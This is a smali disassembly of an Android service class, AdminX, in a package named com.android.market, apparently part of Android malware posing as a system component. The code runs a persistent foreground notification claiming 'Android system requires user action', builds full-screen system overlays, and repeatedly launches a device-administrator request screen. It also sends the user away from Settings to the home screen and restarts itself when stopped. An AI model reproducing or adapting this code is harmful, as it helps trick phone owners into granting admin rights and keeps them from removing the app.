.class public Lcom/android/market/AdminX;
.super Landroid/app/Service;


# instance fields
.field a:Z

.field b:Z

.field c:Landroid/os/Handler;

.field d:Z

.field e:Z


# direct methods
.method public constructor <init>()V
    .locals 2

    const/4 v1, 0x0

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    iput-boolean v1, p0, Lcom/android/market/AdminX;->a:Z

    iput-boolean v1, p0, Lcom/android/market/AdminX;->b:Z

    const/4 v0, 0x0

    iput-object v0, p0, Lcom/android/market/AdminX;->c:Landroid/os/Handler;

    iput-boolean v1, p0, Lcom/android/market/AdminX;->d:Z

    iput-boolean v1, p0, Lcom/android/market/AdminX;->e:Z

    return-void
.end method

.method private a()Landroid/view/WindowManager$LayoutParams;
    .locals 6

    const/4 v1, -0x1

    new-instance v0, Landroid/view/WindowManager$LayoutParams;

    const/16 v3, 0x7d6

    const/16 v4, 0x800

    const/4 v5, -0x3

    move v2, v1

    invoke-direct/range {v0 .. v5}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    return-object v0
.end method

.method static synthetic a(Lcom/android/market/AdminX;)Landroid/view/WindowManager$LayoutParams;
    .locals 1

    invoke-direct {p0}, Lcom/android/market/AdminX;->b()Landroid/view/WindowManager$LayoutParams;

    move-result-object v0

    return-object v0
.end method

.method private a(Landroid/view/WindowManager;Landroid/view/View;IZ)V
    .locals 4

    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    new-instance v1, Lcom/android/market/d;

    invoke-direct {v1, p0, p1, p2, v0}, Lcom/android/market/d;-><init>(Lcom/android/market/AdminX;Landroid/view/WindowManager;Landroid/view/View;Landroid/os/Handler;)V

    int-to-long v2, p3

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method

.method static synthetic a(Lcom/android/market/AdminX;Landroid/view/WindowManager;Landroid/view/View;IZ)V
    .locals 0

    invoke-direct {p0, p1, p2, p3, p4}, Lcom/android/market/AdminX;->a(Landroid/view/WindowManager;Landroid/view/View;IZ)V

    return-void
.end method

.method public static a(Landroid/content/Context;)Z
    .locals 2

    invoke-virtual {p0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/res/Resources;->getConfiguration()Landroid/content/res/Configuration;

    move-result-object v0

    iget v0, v0, Landroid/content/res/Configuration;->screenLayout:I

    and-int/lit8 v0, v0, 0xf

    const/4 v1, 0x3

    if-lt v0, v1, :cond_0

    const/4 v0, 0x1

    :goto_0
    return v0

    :cond_0
    const/4 v0, 0x0

    goto :goto_0
.end method

.method private b()Landroid/view/WindowManager$LayoutParams;
    .locals 6

    const/4 v1, -0x1

    new-instance v0, Landroid/view/WindowManager$LayoutParams;

    const/16 v3, 0x7da

    const/16 v4, 0x800

    const/4 v5, -0x3

    move v2, v1

    invoke-direct/range {v0 .. v5}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    return-object v0
.end method

.method static synthetic b(Lcom/android/market/AdminX;)Landroid/view/WindowManager$LayoutParams;
    .locals 1

    invoke-direct {p0}, Lcom/android/market/AdminX;->a()Landroid/view/WindowManager$LayoutParams;

    move-result-object v0

    return-object v0
.end method

.method private c()V
    .locals 3

    const/high16 v2, 0x10000000

    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.settings.SETTINGS"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/high16 v1, 0x40000000    # 2.0f

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    invoke-virtual {v0, v2}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcom/android/market/AdminX;->startActivity(Landroid/content/Intent;)V

    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.intent.action.MAIN"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v1, "android.intent.category.HOME"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {v0, v2}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcom/android/market/AdminX;->startActivity(Landroid/content/Intent;)V

    return-void
.end method

.method static synthetic c(Lcom/android/market/AdminX;)V
    .locals 0

    invoke-direct {p0}, Lcom/android/market/AdminX;->d()V

    return-void
.end method

.method private d()V
    .locals 3

    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Lcom/android/market/AdminX;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lcom/android/market/AdminRequestor;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v1, "android.intent.action.VIEW"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcom/android/market/AdminX;->startActivity(Landroid/content/Intent;)V

    return-void
.end method

.method static synthetic d(Lcom/android/market/AdminX;)V
    .locals 0

    invoke-direct {p0}, Lcom/android/market/AdminX;->c()V

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 6

    const/4 v5, 0x0

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    new-instance v0, Lcom/android/market/j;

    invoke-direct {v0}, Lcom/android/market/j;-><init>()V

    invoke-virtual {v0, p0}, Lcom/android/market/j;->a(Landroid/content/Context;)V

    new-instance v0, Landroid/app/Notification;

    const v1, 0x108008a

    const-string v2, "Android system requires user action"

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    invoke-direct {v0, v1, v2, v3, v4}, Landroid/app/Notification;-><init>(ILjava/lang/CharSequence;J)V

    new-instance v1, Landroid/content/Intent;

    invoke-virtual {p0}, Lcom/android/market/AdminX;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-class v3, Lcom/android/market/AdminX;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v2, "android.intent.action.VIEW"

    invoke-virtual {v1, v2}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    const/high16 v2, 0x34000000

    invoke-virtual {v1, v2}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    const/high16 v2, 0x8000000

    invoke-static {p0, v5, v1, v2}, Landroid/app/PendingIntent;->getActivity(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v1

    invoke-virtual {p0}, Lcom/android/market/AdminX;->getBaseContext()Landroid/content/Context;

    move-result-object v2

    const-string v3, "Android"

    const-string v4, "Android system requires action"

    invoke-virtual {v0, v2, v3, v4, v1}, Landroid/app/Notification;->setLatestEventInfo(Landroid/content/Context;Ljava/lang/CharSequence;Ljava/lang/CharSequence;Landroid/app/PendingIntent;)V

    iget v1, v0, Landroid/app/Notification;->flags:I

    or-int/lit8 v1, v1, 0x62

    iput v1, v0, Landroid/app/Notification;->flags:I

    const/4 v1, 0x2

    invoke-virtual {p0, v1, v0}, Lcom/android/market/AdminX;->startForeground(ILandroid/app/Notification;)V

    new-instance v0, Lcom/android/market/e;

    invoke-direct {v0, p0}, Lcom/android/market/e;-><init>(Lcom/android/market/AdminX;)V

    new-array v1, v5, [Ljava/lang/Void;

    invoke-virtual {v0, v1}, Lcom/android/market/e;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    return-void
.end method

.method public onDestroy()V
    .locals 3

    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    iget-boolean v0, p0, Lcom/android/market/AdminX;->b:Z

    if-nez v0, :cond_0

    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Lcom/android/market/AdminX;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lcom/android/market/AdminX;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lcom/android/market/AdminX;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_0
    return-void
.end method
